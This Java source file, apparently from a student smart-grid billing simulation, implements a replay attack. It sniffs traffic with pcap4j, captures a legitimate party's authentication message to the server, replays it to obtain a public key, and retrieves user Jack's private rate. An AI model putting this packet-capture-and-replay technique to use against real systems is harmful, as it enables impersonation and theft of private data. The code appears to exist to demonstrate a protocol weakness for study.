package SmartGridBillingSenario.attack;

import SmartGridBillingSenario.message.AuthenticationMessage;
import SmartGridBillingSenario.message.Message;
import SmartGridBillingSenario.message.MessageType;
import SmartGridBillingSenario.message.QuoteAndRateResponseMessage;
import SmartGridBillingSenario.socket.SocketClient;
import SmartGridBillingSenario.utils.Utils;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang3.StringUtils;
import org.pcap4j.packet.Packet;

import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.util.Map;

import static SmartGridBillingSenario.utils.Utils.getTcpValue;

/**
 * Created by yuandai on 4/10/17.
 * <p>
 * <p>
 * Replay attack, FakePP capture the Real PP Authentication, resend the get public key request to TRE,
 * and pass the authentication, get result for User JACK.
 */
@Slf4j
public class FakePP extends Pcap4j {

    private String clientHost;
    private int serverPort;

    private int fakePPPort;

    private AuthenticationMessage authenticationMessage;

    private FakePPClient fakePPClient;

    public FakePP(String clientHost, int serverPort) {
        super(clientHost);

        this.clientHost = clientHost;
        this.serverPort = serverPort;
    }

    @Override
    public void handleTcpData(String srcAddr, String dstAddr, String srcPort, String dstPort, Packet payload) {

        //get message send to TRE and make sure it is not sent by FakePP itself
        if (Integer.valueOf(dstPort) == serverPort && Integer.valueOf(srcPort) != fakePPPort) {
            log.info("Get Info send to server!!! HAHA!!!");

            byte[] tcpRawData = payload.getRawData();
            if (tcpRawData.length > 4) {
                String value = getTcpValue(tcpRawData);
                log.info("Package Aquired, value: {}", value);
                try {
                    Message message = Utils.stringToMessage(value);
                    if (message.getMessageType().equals(MessageType.ATTESTATION_REQUEST)) {
                        authenticationMessage = AuthenticationMessage.fromMessage(message);
                        log.info("Get Real PP Authentication {}, can start Replace Attack", authenticationMessage);
                        startAttack();
                    }
                } catch (Exception e) {
                    return;
                }

            }
        }
    }


    /**
     * Get authentication for Real PP, replace Real PP for getting result for JACK
     */
    private void startAttack() throws IOException, NoSuchAlgorithmException, ClassNotFoundException {
        fakePPClient = new FakePPClient(clientHost, serverPort);
        byte[] publicKey = fakePPClient.getPublicKey();
        String query = "Jack";

        String response = fakePPClient.setEncryptQueryAndGetPrice(query, publicKey);
        log.info("Successfully replace the PP to steal the Rate for Jack!!, Response: {}", response);
    }


    private class FakePPClient extends SocketClient {

        public FakePPClient(String host, int port) {
            super(host, port);
        }


        private byte[] getPublicKey() throws JsonProcessingException {
            log.info("Get Public Key!!");
            ObjectMapper mapper = new ObjectMapper();
            String jsonInString = mapper.writeValueAsString(new Message(MessageType.ATTESTATION_REQUEST, authenticationMessage));
            Message responseForPublicKey = sendToPort(jsonInString);
            fakePPPort = this.clientPort;
            return Base64.decodeBase64(String.valueOf(responseForPublicKey.getObject()));
        }

        private String setEncryptQueryAndGetPrice(String query, byte[] publicInfo) throws NoSuchAlgorithmException, IOException, ClassNotFoundException {

            if (StringUtils.isNotEmpty(query)) {
                String encryptedQuery = Utils.encrypt(query, publicInfo);
                log.info("Send Encrypted value to TRE");
                ObjectMapper mapper = new ObjectMapper();
                String jsonInString = mapper.writeValueAsString(new Message(MessageType.GET_PRICE, encryptedQuery));
                Map<String, Object> result = (Map<String, Object>) sendToPort(jsonInString).getObject();
                QuoteAndRateResponseMessage quoteAndRateResponseMessage = new QuoteAndRateResponseMessage(String.valueOf(result.get("quote")), Integer.valueOf(String.valueOf(result.get("rateValue"))));

                log.info("Great!! Rate Value for user: {} is {}", query, quoteAndRateResponseMessage.getRateValue());
                return String.valueOf(quoteAndRateResponseMessage.getRateValue());
            } else {
                return null;
            }
        }
    }
}
